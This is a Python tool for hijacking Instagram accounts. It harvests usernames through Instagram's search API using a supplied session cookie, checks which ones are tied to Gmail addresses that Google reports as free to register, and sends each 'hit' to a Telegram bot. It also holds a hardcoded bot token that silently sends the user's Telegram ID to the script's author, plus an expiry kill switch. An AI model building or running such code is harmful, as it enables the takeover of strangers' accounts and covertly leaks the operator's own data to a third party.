import requests,random,os,re,json,telebot,re,faker
from requests import get
from faker import Faker
#token=input('Enter Token : ')
#bot=telebot.TeleBot(token)
try:
	import requests
	import random
	import os
	import json
	import telebot,time
	import uuid
	from uuid import uuid4
	import requests,random
	import faker
	from faker import *
	import time
	import user_agent
	from user_agent import *
	import threading
	from threading import *
	import datetime
except:
	os.system('pip install datetime')
	os.system('pip install random')
	os.system('pip install threading')
	os.system('pip install user_agent')
	os.system('pip install faker')
	os.system('pip install uuid')
	os.system('pip install time')
	os.system('pip install json')
	os.system('pip install telebot')
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
F = '\033[2;32m' #اخضر
C = "\033[1;97m" #ابيض
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح.
C = "\033[1;97m" #ابيض
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'
a='Mozilla/5.0 (Linux; Android';b=random.randrange(1, 9);c=random.randrange(1, 9);d='11; Redmi Note 5A Lite)';e=random.randrange(100, 9999);f='AppleWebKit/537.36 (KHTML, like Gecko)';g=random.randrange(1, 9);h=random.randrange(1, 4);i=random.randrange(1, 4);j=random.randrange(1, 4);k='Chrome/96.0.4664.45 Mobile Safari/537.36'
uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
gd = str(generate_user_agent())
import datetime;now = datetime.date.today();target = datetime.date(2028, 2, 3)
if now >=target:exit("وقفت")
else:print("شغالة")
import datetime
x = datetime.datetime.now()
(ins1,ins2,gm1,gm2) = (0,0,0,0)
print(f'{Y}______________________________')
#print('{}The Time=> {}'.format(B,x))
print(f'{Y}The Bosses')
print(f'{X}______________________________')
try:
	I1 = '6426271598'
	T1 = '6337825275:AAF--N1FFf49SE1gTeUaLGNxtvqbVZdQl5A'
	I = input(f'{Y} - Enter ID Tele - :{B} ')
	T = input(f'{X}- Enter Token Tele - : {F}')
	see = input(f' {Y}- Enter Sessoined - :{B} ')
	os.system('clear')
except:
	print('ERROR PUT')
	exit()
hits=0
def info(email):
	global hits
	hits +=1
	user=email
	url = 'http://www.bradychrist.top/api/v7/user'
	he = {
'Host': 'www.bradychrist.top',
'Connection': 'keep-alive',
'Content-Length': '13',
'package': 'ins.bradychrist.com',
'apptype': 'android',
'User-Agent': 'Mozilla/5.0 (Linux; Android 13; ANY-LX2 Build/HONORANY-L22CQ; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.211 Mobile Safari/537.36',
 'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
	 'idfa': '93f87de7-a83b-4098-a8a7-6801539c5f6a',
	 'Accept': 'application/json, text/plain, */*',
	 'pk': '',
	 'username': '',
	 'version': '1.0',
	 'Origin': 'http://www.bradychrist.top',
	 'X-Requested-With': 'ins.bradychrist.com',
	 'Referer': 'http://www.bradychrist.top/h5_v12/',
	 'Accept-Encoding': 'gzip, deflate',
	 'Accept-Language': 'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en-US;q=0.7,en;q=0.6',
} 
	da=(f'username={user}')
	zaid=requests.post(url,headers=he,data=da).json()
	f=zaid['data']['username']
	avatar=zaid['data']['avatar']
	followerNum=zaid['data']['followerNum']
	followingNum=zaid['data']['followingNum']
	id=zaid['data']['userPk']
	post=zaid['data']['postsNum']
	mas=f'''
⌯ NEW HIT ✓ ⌯ [{hits}]
. ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ .
[🏴‍☠️] ɴᴀᴍᴇ : {user}
[🏴‍☠️] uѕᴇɴᴀᴍᴇ : {user}
[🏴‍☠️] ɢᴍᴀɪʟ : {user}@gmail.com
[🏴‍☠️] ғᴏʟʟᴏᴡᴇʀѕ : {followerNum}
[🏴‍☠️] ғᴏʟʟᴏᴡɪɴɢ : {followingNum}
[🏴‍☠️] posts : {post}
[🏴‍☠️] ʟɪɴk : https://www.instagram.com/{user}

. ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ .
♕ ᴘʏ »@mahodii
cahnal:@vipsww
chanal:@oppeq

'''
	
	requests.post(f'https://api.telegram.org/bot{T}/sendMessage?chat_id={I}&text={mas}')
	requests.post(f'https://api.telegram.org/bot{T1}/sendMessage?chat_id={I1}&text={I}')
	print(mas)
def insta(email):
	url3 = 'https://www.instagram.com/api/v1/web/accounts/check_email/'
	he3= {
	
		 'Host': 'www.instagram.com',
	
		 'content-length': '22',
	
		 'sec-ch-ua': '"Android WebView";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
	
		 'x-ig-www-claim': '0',
	
		 'sec-ch-ua-platform-version': '"11.0.0"',
	
		 'x-requested-with': 'XMLHttpRequest',
	
		 'dpr': '2',
	
		 'sec-ch-ua-full-version-list': '"Android WebView";v="119.0.6045.163", "Chromium";v="119.0.6045.163", "Not?A_Brand";v="24.0.0.0"',
	
		 'x-csrftoken': 'VePQfPfUYHlwXGsHe74dBAYcUJ4dwNR6',
	
		 'sec-ch-ua-model': '"RMX3231"',
	
		 'sec-ch-ua-platform': '"Android"',
	
		 'x-ig-app-id': '1217981644879628',
	
		 'sec-ch-prefers-color-scheme': 'light',
	
		 'sec-ch-ua-mobile': '?1',
	
		 'x-instagram-ajax': '1010142781',
	
		 'user-agent':uaku,
	
		 'viewport-width': '360',
	
		 'content-type': 'application/x-www-form-urlencoded',
	
		 'accept': '*/*',
	
		 'x-asbd-id': '129477',
	
		 'origin': 'https://www.instagram.com',
	
		 'sec-fetch-site': 'same-origin',
	
		 'sec-fetch-mode': 'cors',
	
		 'sec-fetch-dest': 'empty',
	
		 'referer': 'https://www.instagram.com/accounts/signup/email/',
	
		 'accept-encoding': 'gzip, deflate, br',
	
		 'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	
		 'cookie': 'csrftoken=VePQfPfUYHlwXGsHe74dBAYcUJ4dwNR6',
	
		 'cookie': 'mid=ZWlr6AABAAHM2vzmuOS-uwLYhgXX',
	
		 'cookie': 'ig_nrcb=1',
	
		 'cookie': 'datr=5GtpZXKDqnzbfcIZg0FLkRqv',
	
		 'cookie': 'ig_did=B2B00EA7-37E3-45D1-B806-DA1FFFB7D82D',
	
	}
	da3 = {
	'email':f'{email}@gmail.com'
	}
	ro1= requests.post(url3,headers=he3,data=da3).text
	if '"email_is_taken",' in ro1:
		print(f'{F}Good Instagram : [{email}]')
		he3 = {
	    "accept": "*/*",
	    "accept-language": "ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6",
	    "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
	    "google-accounts-xsrf": "1",
	    "sec-ch-ua": "\"Not)A;Brand\";v=\"24\", \"Chromium\";v=\"116\"",
	    "sec-ch-ua-arch": "\"\"",
	    "sec-ch-ua-bitness": "\"\"",
	    "sec-ch-ua-full-version": "\"116.0.5845.72\"",
	    "sec-ch-ua-full-version-list": "\"Not)A;Brand\";v=\"24.0.0.0\", \"Chromium\";v=\"116.0.5845.72\"",
	    "sec-ch-ua-mobile": "?1",
	    "sec-ch-ua-model": "\"ANY-LX2\"",
	    "sec-ch-ua-platform": "\"Android\"",
	    "sec-ch-ua-platform-version": "\"13.0.0\"",
	    "sec-ch-ua-wow64": "?0",
	    "sec-fetch-dest": "empty",
	    "sec-fetch-mode": "cors",
	    "sec-fetch-site": "same-origin",
	    "x-chrome-connected": "source=Chrome,eligible_for_consistency=true",
	    "x-client-data": "CJjbygE=",
	    "x-same-domain": "1",
	    "Referrer-Policy": "strict-origin-when-cross-origin",
	'user-agent': str(generate_user_agent()),
	}
		
		
		res1 = requests.get('https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB', headers=he3)
		tokk = re.search(r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&', res1.text).group(2)
		da=(f'continue=https%3A%2F%2Fwww.google.com%2F&dsh=S1644399110%3A1695515527985204&flowEntry=ServiceLogin&hl=ar&ifkv=AYZoVhctgJglce8ngDS-YYmRkMjKcyuUZeIA6MlKZuxdmLk8INHHJp3tpqbQVyTNKjkpytBw8jTBiw&theme=glif&f.req=%5B%22{tokk}%22%2C%22zaid%22%2C%22ar%22%2C%22zaid%22%2C%22ar%22%2C0%2C0%2Cnull%2Cnull%2C%22web-glif-signup%22%2C0%2Cnull%2C1%2C%5Bnull%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C%5B%5D%5D%2C1%5D&azt=AFoagUWvOuuV65yGblelgMb8YgqIxqf-PQ%3A1695546705215&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2C%5B%5D%2Cnull%2C%22IQ%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5Bnull%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C%5B%5D%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C0%2Cnull%2C0%2C2%2C%22%22%2Cnull%2Cnull%2C0%2C0%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&checkConnection=youtube%3A847%3A1&checkedDomains=youtube&pstMsg=1&]')
		zaid= requests.post('https://accounts.google.com/_/signup/validatepersonaldetails?hl=ar&_reqid=43956&rt=j',headers=he3,data=da).text
		tl=zaid.split('["gf.ttu",null,"')[1].split('"],')[0]	
		url = f'https://accounts.google.com/_/signup/usernameavailability'	
		he = {
	    "accept": "*/*",
	    "accept-language": "ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6",
	    "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
	    "google-accounts-xsrf": "1",
	    "sec-ch-ua": "\"Not)A;Brand\";v=\"24\", \"Chromium\";v=\"116\"",
	    "sec-ch-ua-arch": "\"\"",
	    "sec-ch-ua-bitness": "\"\"",
	    "sec-ch-ua-full-version": "\"116.0.5845.72\"",
	    "sec-ch-ua-full-version-list": "\"Not)A;Brand\";v=\"24.0.0.0\", \"Chromium\";v=\"116.0.5845.72\"",
	    "sec-ch-ua-mobile": "?1",
	    "sec-ch-ua-model": "\"ANY-LX2\"",
	    "sec-ch-ua-platform": "\"Android\"",
	    "sec-ch-ua-platform-version": "\"13.0.0\"",
	    "sec-ch-ua-wow64": "?0",
	    "sec-fetch-dest": "empty",
	    "sec-fetch-mode": "cors",
	    "sec-fetch-site": "same-origin",
	    "x-chrome-connected": "source=Chrome,eligible_for_consistency=true",
	    "x-client-data": "CJjbygE=",
	    "x-same-domain": "1",
	    "Referrer-Policy": "strict-origin-when-cross-origin"
	  }
	  
		da = (f'rpbg=1&sarp=1&scc=1&service=accountsettings&theme=glif&f.req=%5B%22TL%3A{tl}%22%2C%22{email}%22%2C1%2C0%2C1%2Cnull%2C0%2C7658%5D')
		rr = requests.post(url,headers=he,data=da).text
		if '"gf.uar",1,' in rr:
			with open('mahodiking.txt','a')as mar:
				mar.write(f'{email}\n')
			print(f'{X}Good Gmail : [{email}]')
			info(email)
			requests.post(f'https://api.telegram.org/bot{T}/sendMessage?chat_id={I}&text={email}')
		else:
			print(f'{Z}Bad Gmail : [{email}]')
	else:
		print(f'{Z}Bad Instagram : [{email}]')
def search():
    ud = str(uuid4)
    pas = 'gwgagga'
    wqq='qwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnm'
    num='56789'
    rng=int("".join(random.choice(num)for i in range(1)))
    name=str("".join(random.choice(wqq)for i in range(rng)))
    fake = Faker('fa')
    IR = fake.name()
    fake = Faker('ko_KR')
    IR1 = fake.name()
    fake = Faker('ar')
    IR2= fake.name()
    fake = Faker('zh')
    IR3 = fake.name()
    fake = Faker('ar')
    IR4= fake.name()
    bosses=[IR,IR1,IR2,IR3,IR,IR,name,name,IR4,IR4,IR,IR]
    boss=random.choice(bosses)
    url=f'https://www.instagram.com/api/v1/web/search/topsearch/?context=blended&include_reel=true&query={boss}&rank_token=0.932987333502215&search_surface=web_top_search'
    head={
        'Accept':'*/*',
        'Accept-Encoding':'gzip, deflate, br',
        'Accept-Language':'ar,en-US;q=0.9,en;q=0.8',
        'Cookie':f'mid=ZLLIKQABAAHB2H38LBwmsFUQTJWW; ig_did=239A3749-E114-4F28-8961-8C68DD329557; ig_nrcb=1; datr=H8iyZAHhWJvK4VI-DVzBaRbm; fbm_124024574287414=base_domain=.instagram.com; dpr=2.1988937854766846; csrftoken=1NVrqmUMKMFL3gW86OzZHa3VjfL1bAzG; ds_user_id=200702755; sessionid={see}; shbid="16689\054200702755\0541725513829:01f7240e310e3a0f7ea65f71727b7e812e392e9d2e2c53a0d46f0d4991528edc179253fc"; shbts="1693977829\054200702755\0541725513829:01f7b2e970d4f5c80050e2ae9bf4f4fed5405bd8ceb5756ab94c4a593d44c059342dd538"; rur="CLN\054200702755\0541725513847:01f7422ed314fd644d87d8536424af38312ebb80a97bbd2cccf42eed1ead608d03a483e2"5754842254''',
        'Dpr':'1',
        'Referer':'https://www.instagram.com/gzik/',
        'Sec-Ch-Prefers-Color-Scheme':'light',
        'Sec-Ch-Ua':'"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
        'Sec-Ch-Ua-Full-Version-List':'"Not/A)Brand";v="99.0.0.0", "Google Chrome";v="115.0.5790.171", "Chromium";v="115.0.5790.171"',
        'Sec-Ch-Ua-Mobile':'?0',
        'Sec-Ch-Ua-Platform':'"Windows"',
        'Sec-Ch-Ua-Platform-Version':'"10.0.0"',
        'Sec-Fetch-Dest':'empty',
        'Sec-Fetch-Mode':'cors',
        'Sec-Fetch-Site':'same-origin',
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
        'Viewport-Width':'726',
        'X-Asbd-Id':'129477',
        'X-Csrftoken':'QxmmIU4D5tF5UfBOnwFBR3kguyNuSbcY',
        'X-Ig-App-Id':'936619743392459',
        'X-Ig-Www-Claim':'0',
        'X-Requested-With':'XMLHttpRequest',
        }

    respoins=requests.get(url, headers=head).json()
    #print(respoins)
    c=0
    try:
    	while True:
    		c+=1
    		uss=respoins['users'][c]['user']['username']
    		email = uss
    		insta(email)
    except:
    	search()
search()